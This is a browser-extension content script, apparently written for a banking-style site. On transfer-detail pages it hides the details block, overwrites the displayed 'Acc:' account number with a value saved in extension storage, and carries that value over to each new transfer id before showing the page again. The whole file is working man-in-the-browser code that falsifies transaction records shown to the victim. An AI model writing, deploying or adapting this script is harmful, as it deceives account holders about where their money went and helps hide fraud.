var customStyles = document.createElement('style')
customStyles.appendChild(document.createTextNode(
    ".transferdetails {visibility: hidden;}"
));
document.documentElement.appendChild(customStyles)

document.addEventListener("DOMContentLoaded", function() {
    transidx = "-1"
    if (document.location.pathname.startsWith("/transfers/details/")){
        transidx = document.location.pathname.slice(19)
    }
    resul = browser.storage.local.get(transidx)
    resul.then((value) => {
        if (transidx in value){
            deets = document.getElementsByClassName("transferdetails")[0].children
            for (parag of deets){
                if (parag.textContent.startsWith("Acc:")){
                    parag.textContent = "Acc: " + value[transidx]
                }
            }
            document.documentElement.removeChild(customStyles);
        }
        else {
            restwo = browser.storage.local.get("-1")
            restwo.then((value) => {
                if ("-1" in value){
                    deets = document.getElementsByClassName("transferdetails")[0].children
                    for (parag of deets){
                        if (parag.textContent.startsWith("Acc:")){
                            parag.textContent = "Acc: " + value["-1"]
                        }
                    }
                    newobj = {}
                    newobj[transidx] = value["-1"]
                    browser.storage.local.set(newobj)
                    browser.storage.local.remove("-1")
                }
                document.documentElement.removeChild(customStyles);
            })
        }
    });

});
